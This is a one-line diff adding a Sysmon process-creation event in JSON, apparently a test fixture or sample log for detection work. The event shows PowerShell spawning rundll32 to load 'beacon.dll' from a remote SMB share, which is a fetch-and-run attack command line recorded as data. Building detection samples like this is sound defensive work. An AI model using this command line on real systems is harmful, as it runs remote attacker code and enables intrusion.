@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WKS07"}, "EventData": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe \\\\10.10.14.7\\share\\beacon.dll,StartW", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "CORP\\victim"}}}
